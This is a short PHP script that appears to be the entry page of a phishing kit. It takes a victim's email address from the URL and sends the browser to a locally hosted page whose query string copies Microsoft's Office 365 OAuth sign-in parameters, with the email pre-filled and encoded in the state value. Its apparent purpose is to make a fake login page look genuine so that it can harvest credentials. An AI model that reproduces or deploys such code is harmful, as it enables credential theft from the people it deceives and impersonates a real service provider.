<?php

session_start();

require 'common/api.php';

if (isset($_GET['email'])) {
$email = $_GET['email'];
$var = explode('@', $email);
$domain = array_pop($var);
$state = base64_encode($email);
}

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: ./common/?client_id=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=f6f90abe-f003-4840-8433-638d72efae5f&protectedtoken=true&domain_hint=$domain&nonce=637224124682299008.a200ff88-f2c2-4caf-a148-1ba4ad8a317d");
}
elseif (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: ./common/authorize.php?client_id=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=f6f90abe-f003-4840-8433-638d72efae5f&protectedtoken=true&domain_hint=$domain&nonce=637224124682299008.a200ff88-f2c2-4caf-a148-1ba4ad8a317d&state=$state");
}
else{
     include "common/404.php";
}

?>

